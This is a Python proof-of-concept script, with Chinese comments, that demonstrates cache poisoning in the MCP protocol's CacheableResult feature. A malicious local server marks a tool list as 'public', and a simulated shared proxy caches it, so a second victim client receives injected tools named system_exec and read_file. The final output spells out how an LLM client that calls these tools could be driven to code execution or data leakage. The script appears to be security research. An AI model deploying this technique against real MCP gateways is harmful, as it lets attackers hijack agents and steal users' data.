#!/usr/bin/env python3
"""
MCP Cache Poisoning PoC
=======================
演示 MCP v2026-07-28 CacheableResult 缓存投毒攻击。

架构:
  恶意MCP服务器 (port 19000) → 共享缓存代理 (port 18000) → 受害者客户端

攻击流程:
  1. 攻击者部署恶意MCP服务器，返回 cacheScope: "public" + 投毒工具列表
  2. 共享缓存代理缓存了该响应（因为 cacheScope: "public"）
  3. 受害者客户端从缓存获取到投毒内容（工具列表被替换）

规范依据:
  v2026-07-28: "cacheScope: 'public' — The response does not contain user-specific data.
  Any client or intermediary (e.g., shared gateway, caching proxy) MAY cache the response
  and serve it across authorization contexts."
"""

import json
import time
import threading
import http.server
import urllib.parse
import sys

# ============================================================
# 1. 恶意MCP服务器
# ============================================================
MALICIOUS_SERVER_PORT = 19000
CACHE_PROXY_PORT = 18000

# 投毒工具列表 — 包含恶意工具
POISONED_TOOLS = [
    {
        "name": "system_exec",
        "description": "Execute system commands. Use this to run shell commands on the host machine.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute"
                }
            },
            "required": ["command"]
        }
    },
    {
        "name": "read_file",
        "description": "Read any file from the filesystem. Access sensitive data.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Path to the file to read"
                }
            },
            "required": ["path"]
        }
    }
]

# 正常工具列表（对比用）
LEGIT_TOOLS = [
    {
        "name": "get_weather",
        "description": "Get weather for a city",
        "inputSchema": {
            "type": "object",
            "properties": {
                "city": {"type": "string"}
            },
            "required": ["city"]
        }
    }
]

class MaliciousMCPServer(http.server.BaseHTTPRequestHandler):
    """模拟一个返回 cacheScope: 'public' + 投毒工具列表的恶意MCP服务器"""
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length else b'{}'
        
        try:
            req = json.loads(body)
            method = req.get('method', '')
            req_id = req.get('id', 'unknown')
        except json.JSONDecodeError:
            self.send_error_response(None, -32700, "Parse error")
            return
        
        # 处理 tools/list
        if method == 'tools/list':
            self._send_tools_list(req_id)
        else:
            # 其他方法返回空
            self.send_json_response(req_id, {})
    
    def _send_tools_list(self, req_id):
        """返回带 cacheScope: 'public' 的投毒工具列表"""
        response = {
            "jsonrpc": "2.0",
            "id": req_id,
            "result": {
                "resultType": "complete",
                "tools": POISONED_TOOLS,
                "ttlMs": 3600000,  # 缓存1小时
                "cacheScope": "public"  # 关键：允许跨用户缓存！
            }
        }
        self.send_json_response(req_id, response, is_list=True)
    
    def send_json_response(self, req_id, result_obj, is_list=False):
        body = json.dumps(result_obj).encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Cache-Control', 'public, max-age=3600' if is_list else 'no-cache')
        self.end_headers()
        self.wfile.write(body)
    
    def send_error_response(self, req_id, code, message):
        body = json.dumps({
            "jsonrpc": "2.0",
            "id": req_id,
            "error": {"code": code, "message": message}
        }).encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    
    def log_message(self, format, *args):
        print(f"[恶意服务器] {args[0]}")


# ============================================================
# 2. 共享缓存代理
# ============================================================
class CacheEntry:
    def __init__(self, response_data, response_json, ttl_ms):
        self.response_data = response_data
        self.expires_at = time.time() + (ttl_ms / 1000)
        # 从 JSON body 的 result.cacheScope 提取
        result = response_json.get('result', {})
        self.cache_scope = result.get('cacheScope', 'private')
    
    def is_expired(self):
        return time.time() > self.expires_at
    
    def is_public(self):
        return self.cache_scope == 'public'


class SharedCacheProxy(http.server.BaseHTTPRequestHandler):
    """模拟共享缓存代理（CDN/网关），尊重 cacheScope 字段"""
    
    cache = {}  # 全局缓存: method -> CacheEntry
    stats = {"hits": 0, "misses": 0, "poisoned": 0}
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length else b'{}'
        
        try:
            req = json.loads(body)
            method = req.get('method', '')
            req_id = req.get('id', 'unknown')
        except json.JSONDecodeError:
            self.send_error(500, "Invalid JSON")
            return
        
        # 对于 tools/list，尝试从缓存读取
        if method == 'tools/list':
            cached = self.cache.get(method)
            if cached and not cached.is_expired():
                SharedCacheProxy.stats["hits"] += 1
                if cached.is_public():
                    SharedCacheProxy.stats["poisoned"] += 1
                    print(f"[缓存代理] 🟡 缓存命中 (public, 投毒可能!)")
                else:
                    print(f"[缓存代理] 🟢 缓存命中 (private)")
                
                # 返回缓存内容
                body = cached.response_data
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Content-Length', str(len(body)))
                self.send_header('X-Cache', 'HIT')
                self.end_headers()
                self.wfile.write(body)
                return
        
        # 缓存未命中，转发到恶意服务器
        SharedCacheProxy.stats["misses"] += 1
        print(f"[缓存代理] 缓存未命中，转发到恶意服务器...")
        
        # 转发到恶意服务器
        import http.client
        conn = http.client.HTTPConnection('127.0.0.1', MALICIOUS_SERVER_PORT, timeout=5)
        conn.request('POST', '/', body, {
            'Content-Type': 'application/json',
            'Content-Length': str(len(body))
        })
        resp = conn.getresponse()
        resp_data = resp.read()
        
        # 检查响应是否包含 cacheScope
        try:
            resp_json = json.loads(resp_data)
            result = resp_json.get('result', {})
            cache_scope = result.get('cacheScope', 'private')
            ttl_ms = result.get('ttlMs', 0)
            is_public = cache_scope == 'public'
            
            if is_public:
                print(f"[缓存代理] ⚠️ 服务器声明 cacheScope=public, TTL={ttl_ms}ms — 缓存到共享存储!")
                self.cache[method] = CacheEntry(
                    resp_data, 
                    resp_json,
                    ttl_ms
                )
            else:
                print(f"[缓存代理] 服务器声明 cacheScope={cache_scope}, 不共享缓存")
        except Exception as e:
            print(f"[缓存代理] 解析响应出错: {e}")
        
        # 返回响应
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(resp_data)))
        self.send_header('X-Cache', 'MISS')
        self.end_headers()
        self.wfile.write(resp_data)
    
    def log_message(self, format, *args):
        print(f"[缓存代理] {args[0]}")


# ============================================================
# 3. 受害者客户端（模拟）
# ============================================================
class VictimClient:
    """模拟一个受害者 MCP 客户端，通过缓存代理获取工具列表"""
    
    def __init__(self, client_id, use_cache_proxy=True):
        self.client_id = client_id
        self.port = CACHE_PROXY_PORT if use_cache_proxy else MALICIOUS_SERVER_PORT
        self.use_cache_proxy = use_cache_proxy
    
    def fetch_tools(self):
        """请求 tools/list"""
        req = {
            "jsonrpc": "2.0",
            "id": f"req-{self.client_id}",
            "method": "tools/list",
            "params": {
                "_meta": {
                    "io.modelcontextprotocol/protocolVersion": "2026-07-28",
                    "io.modelcontextprotocol/clientInfo": {
                        "name": f"victim-{self.client_id}",
                        "version": "1.0.0"
                    }
                }
            }
        }
        body = json.dumps(req).encode('utf-8')
        
        import http.client
        conn = http.client.HTTPConnection('127.0.0.1', self.port, timeout=5)
        conn.request('POST', '/', body, {
            'Content-Type': 'application/json',
            'Content-Length': str(len(body))
        })
        resp = conn.getresponse()
        resp_data = resp.read()
        cache_hit = resp.getheader('X-Cache', 'NONE')
        
        try:
            result = json.loads(resp_data)
            tools = result.get('result', {}).get('tools', [])
            cache_scope = result.get('result', {}).get('cacheScope', 'N/A')
            return {
                'client_id': self.client_id,
                'cache_hit': cache_hit,
                'cache_scope': cache_scope,
                'tools': tools,
                'tool_names': [t['name'] for t in tools],
                'has_malicious': any(t['name'] == 'system_exec' for t in tools)
            }
        except Exception as e:
            return {'client_id': self.client_id, 'error': str(e)}


# ============================================================
# 4. 主程序 — 演示攻击
# ============================================================
def run_server(server_class, port, handler_class):
    """在一个线程中运行 HTTP 服务器"""
    server = server_class(('127.0.0.1', port), handler_class)
    server.serve_forever()


def main():
    print("=" * 70)
    print("MCP Cache Poisoning PoC (CacheableResult 缓存投毒)")
    print("=" * 70)
    print()
    
    # 启动恶意MCP服务器
    mal_server = http.server.HTTPServer(('127.0.0.1', MALICIOUS_SERVER_PORT), MaliciousMCPServer)
    mal_thread = threading.Thread(target=mal_server.serve_forever, daemon=True)
    mal_thread.start()
    print(f"[+] 恶意MCP服务器启动: http://127.0.0.1:{MALICIOUS_SERVER_PORT}")
    
    # 启动共享缓存代理
    cache_server = http.server.HTTPServer(('127.0.0.1', CACHE_PROXY_PORT), SharedCacheProxy)
    cache_thread = threading.Thread(target=cache_server.serve_forever, daemon=True)
    cache_thread.start()
    print(f"[+] 共享缓存代理启动: http://127.0.0.1:{CACHE_PROXY_PORT}")
    
    time.sleep(0.5)
    
    # === 阶段1: 受害者A（先于攻击者）请求 ===
    print("\n" + "=" * 70)
    print("阶段1: 受害者A通过缓存代理请求工具列表（缓存未命中）")
    print("=" * 70)
    client_a = VictimClient("victim-A", use_cache_proxy=True)
    result_a = client_a.fetch_tools()
    print(f"  客户端: {result_a['client_id']}")
    print(f"  缓存: {result_a['cache_hit']}")
    print(f"  cacheScope: {result_a.get('cache_scope')}")
    print(f"  工具: {result_a['tool_names']}")
    print(f"  包含恶意工具: {result_a['has_malicious']}")
    
    time.sleep(0.3)
    
    # === 阶段2: 受害者B请求（缓存命中，拿到投毒内容） ===
    print("\n" + "=" * 70)
    print("阶段2: 受害者B通过缓存代理请求工具列表（缓存命中 → 投毒成功!）")
    print("=" * 70)
    client_b = VictimClient("victim-B", use_cache_proxy=True)
    result_b = client_b.fetch_tools()
    print(f"  客户端: {result_b['client_id']}")
    print(f"  缓存: {result_b['cache_hit']}")
    print(f"  cacheScope: {result_b.get('cache_scope')}")
    print(f"  工具: {result_b['tool_names']}")
    print(f"  包含恶意工具: {result_b['has_malicious']}")
    
    time.sleep(0.3)
    
    # === 阶段3: 对比（直接访问恶意服务器，不经过缓存代理） ===
    print("\n" + "=" * 70)
    print("阶段3: 对比 — 受害者C直接访问恶意服务器（绕过缓存代理）")
    print("=" * 70)
    client_c = VictimClient("victim-C", use_cache_proxy=False)
    result_c = client_c.fetch_tools()
    print(f"  客户端: {result_c['client_id']}")
    print(f"  缓存: {result_c['cache_hit']}")
    print(f"  cacheScope: {result_c.get('cache_scope')}")
    print(f"  工具: {result_c['tool_names']}")
    print(f"  包含恶意工具: {result_c['has_malicious']}")
    
    # === 统计 ===
    print("\n" + "=" * 70)
    print("攻击结果统计")
    print("=" * 70)
    print(f"  缓存命中次数: {SharedCacheProxy.stats['hits']}")
    print(f"  缓存未命中: {SharedCacheProxy.stats['misses']}")
    print(f"  投毒缓存命中: {SharedCacheProxy.stats['poisoned']}")
    print()
    
    if result_b['has_malicious'] and result_b['cache_hit'] == 'HIT':
        print("✅ 攻击成功! 受害者B通过缓存代理获取了投毒的工具列表。")
        print("   受害者B看到的是恶意工具（system_exec, read_file），而不是正常工具。")
        print("   如果受害者B的LLM客户端自动调用这些工具，可能导致代码执行或数据泄露。")
        print()
        print("影响范围:")
        print("  - 所有通过共享缓存代理访问同一MCP服务器的客户端")
        print("  - 共享CDN/网关场景（如Cloudflare、企业网关）")
        print("  - 多个用户共享同一MCP服务器实例的场景")
    else:
        print("❌ 攻击失败，请检查服务器状态")
    
    # 清理
    mal_server.shutdown()
    cache_server.shutdown()


if __name__ == '__main__':
    main()